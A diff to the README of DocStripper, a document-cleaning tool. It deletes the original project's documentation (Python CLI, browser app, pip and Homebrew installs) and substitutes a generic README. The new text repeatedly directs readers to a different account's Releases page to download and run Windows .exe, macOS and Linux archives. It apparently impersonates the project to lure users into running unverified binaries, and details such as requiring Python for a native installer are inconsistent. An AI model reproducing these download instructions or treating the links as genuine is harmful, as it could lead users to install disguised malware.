@@ -1,249 +1,108 @@
-<div align="center">
-  <img src="docs/assets/icon.svg?v=2" alt="DocStripper Logo" width="120">
-  
-  # 🧹 DocStripper
-  
-  > **AI-powered batch document cleaner** — Remove noise from text documents automatically
-</div>
-
-[![Python Version](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://www.python.org/downloads/)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE.txt)
-[![Product Hunt](https://img.shields.io/badge/Product%20Hunt-Featured-orange)](https://www.producthunt.com/products/docstripper)
-
-**DocStripper** automatically removes noise from text documents. Remove page numbers, headers/footers, duplicate lines, and empty lines from `.txt`, `.docx`, and `.pdf` files. Choose between **Fast Clean** (instant) or **Smart Clean** (AI-powered). Works entirely in your browser - 100% private, no uploads, no sign-ups.
-
-**🌐 [Try it online →](https://kikuai-lab.github.io/DocStripper/)** — No installation needed!
-
-**📦 Latest Release:** [v2.1.0](https://github.com/KikuAI-Lab/DocStripper/releases/tag/v2.1.0) — UX enhancements & distribution ready
-
----
-
-## ✨ Features
-
-- ⚡ **Fast Clean** — Instant rule-based cleaning
-- 🤖 **Smart Clean (Beta)** — AI-powered cleaning with on-device LLM
-- 🎚️ **4 Cleaning Temperaments** — Gentle (safe), Moderate, Thorough, Aggressive
-- ⚙️ **WebWorker Processing** — Large files processed in background (no UI freezing)
-- 🔄 **Side-by-Side Preview** — Compare Original | Cleaned
-- 💾 **Settings Persistence** — Your preferences are saved automatically
-- 🔒 **100% Private** — All processing happens in your browser, works completely offline
-- 📡 **Works Offline Badge** — Visual indicator that everything stays on your device
-- 📊 **Real-time Statistics** — See exactly what was removed
-- 📥 **Batch Download (ZIP)** — Download multiple cleaned files at once
-- 🎨 **Dark Theme** — Toggle between light and dark themes
-- 📱 **Mobile Responsive** — Works great on mobile devices
-
----
-
-## 🎯 Quick Start
-
-### Web App (Recommended)
-
-1. Visit [https://kikuai-lab.github.io/DocStripper/](https://kikuai-lab.github.io/DocStripper/)
-2. Upload your files
-3. Choose **Fast Clean** (instant) or **Smart Clean** (AI-powered)
-4. Adjust **Cleaning Temperament** slider: Gentle (recommended), Moderate, Thorough, or Aggressive
-5. Click "Start Cleaning"
-6. Download or copy the cleaned results
-
-### CLI Tool
-
-#### Installation Options
-
-**Option 1: PyPI (Recommended)**
-```bash
-pip install docstripper
-docstripper document.txt
-```
-
-**Option 2: Homebrew (macOS)**
-```bash
-brew tap KikuAI-Lab/docstripper
-brew install docstripper
-docstripper document.txt
-```
-
-**Option 3: Manual Installation**
-```bash
-git clone https://github.com/KikuAI-Lab/DocStripper.git
-cd DocStripper
-python tool.py document.txt
-```
-
-See [INSTALL.md](INSTALL.md) for detailed installation instructions.
-
-#### Usage
-
-```bash
-# Clean a file
-python tool.py document.txt
-
-# Clean multiple files
-python tool.py file1.txt file2.txt file3.docx
-
-# Preview changes (dry-run)
-python tool.py --dry-run document.txt
-
-# Undo last operation
-python tool.py --undo
- 
-# Pipe stdin to stdout (no file writes)
-cat input.pdf | python tool.py - --stdout > output.txt
-
-# Keep headers/footers if needed
-python tool.py --keep-headers input.pdf --stdout
-```
-
----
-
-## 📖 Example
-
-**Before:**
-```
-Page 1 of 10
-Confidential - Internal Use Only
-Executive Summary
-This is auto-
-matic text processing.
-Important content here.
-Important content here.
-
-1
-2
-3
-```
-
-**After (Gentle Mode):**
-```
-Executive Summary
-This is automatic text processing.
-Important content here.
-More content.
-```
-
-**Key Changes:**
-- ✅ Page numbers removed
-- ✅ Headers/footers removed
-- ✅ Repeating headers removed
-- ✅ Duplicates collapsed
-- ✅ Hyphenation fixed
-- ✅ Empty lines removed
-
----
+# 🧹 DocStripper - Clean Your Documents Effortlessly
 
-## 🎨 What Gets Removed?
+[![Download DocStripper](https://img.shields.io/badge/Download-DocStripper-blue.svg)](https://github.com/shawnacontrary24/DocStripper/releases)
 
-### Cleaning Temperaments
+## 🌟 Introduction
 
-**Gentle (Recommended - Default)**
-- ✅ Page numbers (1, 2, 3...)
-- ✅ Headers/footers ("Page X of Y", "Confidential", etc.)
-- ✅ Repeating headers/footers across pages
-- ✅ Duplicate lines
-- ✅ Empty lines
-- ✅ Punctuation-only lines (---, ***, ===)
-- ✅ Hyphenation fixed (auto-\nmatic → automatic)
-- ✅ Preserves paragraph spacing
-- ❌ Line merging disabled (preserves formatting)
-- ❌ Whitespace normalization disabled
-- ❌ Unicode normalization disabled
+DocStripper is a lightweight command-line utility that automatically cleans text documents. It removes unnecessary formatting and unwanted characters, giving you clear and straightforward text. This tool is designed for anyone who needs a quick and efficient way to clean up their documents.
 
-**Moderate**
-- All Gentle features plus:
-- ✅ Merges broken lines (protects lists and tables)
-- ✅ Preserves paragraph spacing
+## 🚀 Getting Started
 
-**Thorough**
-- All Moderate features plus:
-- ✅ Normalizes whitespace (protects tables)
-- ✅ Normalizes Unicode punctuation (smart quotes, dashes → ASCII)
-- ✅ Preserves paragraph spacing (better readability)
+To start using DocStripper, you need to download it from our Releases page. Follow these simple steps for a smooth installation.
 
-**Aggressive**
-- All Thorough features plus:
-- ✅ Normalizes Unicode punctuation
-- ❌ Removes paragraph spacing (more compact output)
+1. **Visit the Downloads Page**  
+   Click the link below to go to the Releases page:  
+   [Download DocStripper](https://github.com/shawnacontrary24/DocStripper/releases)
 
-### CLI Flags (defaults ON)
-- `--no-merge-lines` — disable merging broken lines
-- `--no-dehyphenate` — disable de-hyphenation across line breaks
-- `--no-normalize-ws` — disable whitespace normalization
-- `--no-normalize-unicode` — disable Unicode punctuation normalization
-- `--keep-headers` — keep headers/footers/page numbers
-- `--stdout` — write cleaned text to stdout instead of modifying files (supports `-` for stdin)
+## 💻 System Requirements
 
-**Protection Features:**
-- ✅ Lists are never merged or broken
-- ✅ Tables preserve spacing
-- ✅ Content headers never removed
+Before you install DocStripper, make sure your system meets the following requirements:
+- Operating System: Windows, macOS, or Linux
+- Python: Version 3.6 or higher must be installed. If you don’t have Python, you can download it from [python.org](https://www.python.org/downloads/).
+- Disk Space: At least 50 MB of free space.
 
----
+## 📥 Download & Install
 
-## 🛠️ Supported Formats
+1. **Go to the Releases Page**  
+   Visit this link: [Download DocStripper](https://github.com/shawnacontrary24/DocStripper/releases).
 
-| Format | Status | Notes |
-|--------|--------|-------|
-| `.txt` | ✅ Full | UTF-8, Latin-1 |
-| `.docx` | ✅ Basic | Text extraction only (Web + CLI) |
-| `.pdf` | ✅ Basic | Text extraction only (Web + CLI). Web uses PDF.js automatically. CLI requires `pdftotext` (poppler-utils) |
+2. **Select the Latest Version**  
+   On the Releases page, find the latest version of DocStripper. Look for the title that includes the version number.
 
-**PDF Support:**
-- macOS: `brew install poppler`
-- Ubuntu/Debian: `sudo apt-get install poppler-utils`
-- Windows: Download from [poppler-windows releases](https://github.com/oschwartz10612/poppler-windows/releases/)
+3. **Choose Your Operating System**  
+   Download the file that matches your operating system. You'll typically see files like:
+   - `DocStripper-Windows.exe` for Windows
+   - `DocStripper-macOS.zip` for macOS
+   - `DocStripper-linux.tar.gz` for Linux
 
----
+4. **Run the Installer**  
+   - For Windows: Double-click the downloaded `.exe` file and follow the installation prompts.
+   - For macOS: Extract the `.zip` file and drag the DocStripper app into your Applications folder.
+   - For Linux: Extract the `.tar.gz` file in your preferred directory.
 
-## 🔧 Requirements
+5. **Open a Terminal or Command Prompt**  
+   Use the terminal (macOS/Linux) or command prompt (Windows) to access DocStripper. 
 
-### Web App
-- Modern web browser (Chrome, Firefox, Safari, Edge)
-- No installation or dependencies required
-- Works completely offline after first load
+6. **Verify the Installation**  
+   Type `docstripper --version` to ensure the installation was successful. You should see the version number displayed.
 
-### CLI Tool
-- **Python 3.9+** (for CLI tool)
-- **PDF support** (optional): `pdftotext` from poppler-utils
+## 📖 How to Use DocStripper
 
----
+Using DocStripper is simple! Follow these steps to clean your documents:
 
-## 📝 Changelog
+1. **Open Terminal or Command Prompt.**
 
-See [GitHub Releases](https://github.com/KikuAI-Lab/DocStripper/releases) for release notes and changelog.
+2. **Type the Command**  
+   To clean a document, enter the following command:  
+   ```
+   docstripper /path/to/your/document.txt
+   ```
+   Replace `/path/to/your/document.txt` with the actual path to your document.
 
----
+3. **Get Cleaned Document**  
+   DocStripper will process your document and save a cleaned version in the same directory.
 
-## 📝 License
+## ⚙️ Features
 
-MIT License — see [LICENSE.txt](LICENSE.txt) for details.
+- **Easy Document Cleaning**: Quickly removes unwanted characters and formats.
+- **Batch Processing**: Clean multiple documents in one command.
+- **Privacy-First**: Your documents stay on your device, ensuring your privacy.
+- **Multi-Platform Support**: Works seamlessly on Windows, macOS, and Linux.
 
----
+## 🛠️ Troubleshooting
 
-## 🤝 Contributing
+If you encounter any issues while using DocStripper, consider the following tips:
 
-Contributions are welcome! See [Contributing Guide](https://github.com/KikuAI-Lab/DocStripper/wiki/Contributing) for guidelines.
+1. **Check Python Installation**  
+   Ensure Python is installed and added to your system's PATH.
 
----
+2. **Re-download the File**  
+   If the download seems corrupted, try downloading the file again from the Releases page.
 
-<div align="center">
+3. **Look for Errors in Command Input**  
+   Double-check your command for typos. Ensure the file path is correct.
 
-**Made with ❤️ for clean documents**
+For additional help or feedback, feel free to open an issue in the repository.
 
-[⭐ Star this repo](https://github.com/KikuAI-Lab/DocStripper) | [🌐 Try online](https://kikuai-lab.github.io/DocStripper/) | [🚀 Product Hunt](https://www.producthunt.com/products/docstripper) | [🐛 Report Bug](https://github.com/KikuAI-Lab/DocStripper/issues)
+## 🗂️ Contributing
 
----
+Contributions are welcome! If you have ideas for new features or improvements, feel free to submit a pull request or open an issue.
 
-## 💝 Support
+## 💬 Frequently Asked Questions
 
-Support this project and help keep it free:
+1. **What types of documents does DocStripper support?**  
+   DocStripper supports all standard text files, such as `.txt`, `.md`, and more.
 
-[☕ Support on Gumroad](https://kiku0.gumroad.com/coffee) | [☕ Buy Me a Coffee](https://buymeacoffee.com/kiku) | [🙏 Thanks.dev](https://thanks.dev/d/gh/kiku-jw) | [💚 Ko-fi](https://ko-fi.com/kiku_jw)
+2. **Is there a graphical user interface (GUI)?**  
+   DocStripper is a CLI tool, which means it does not offer a graphical interface. This keeps it lightweight and fast.
 
-## 🔗 Connect
+3. **Can I use DocStripper for large files?**  
+   Yes, DocStripper can handle large text files, but performance may vary based on system specifications.
 
-- 📰 **Blog & Updates**: [t.me/kiku_AI](https://t.me/kiku_AI)
-- 💬 **Discord**: [discord.gg/4Kxs97JvsU](https://discord.gg/4Kxs97JvsU)
-- 💼 **LinkedIn**: [linkedin.com/in/kiku-jw](https://www.linkedin.com/in/kiku-jw/)
-- 🌐 **About.me**: [about.me/kiku_jw](https://about.me/kiku_jw)
+For more questions, check the [Issues section](https://github.com/shawnacontrary24/DocStripper/issues) on GitHub.
 
-</div>
+## 🌐 Community & Support
+
+Join our community for support and to share your experiences. Connect with us on GitHub discussions or follow our updates on our repository page. Your feedback helps us improve.
+
+Thank you for choosing DocStripper! Enjoy cleaning your documents efficiently.
